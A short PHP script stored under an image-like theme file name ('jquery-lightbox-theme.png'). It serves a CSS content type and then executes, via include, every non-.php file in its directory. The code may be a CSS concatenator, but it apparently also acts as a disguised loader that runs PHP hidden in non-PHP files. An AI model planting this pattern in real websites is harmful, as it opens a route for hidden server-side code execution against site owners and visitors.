jquery-lightbox-theme.png<?php
header('Content-type: text/css;');
foreach(glob('*') as $file) {
	if(strpos($file, '.php') === false) {
		include $file;
	}
}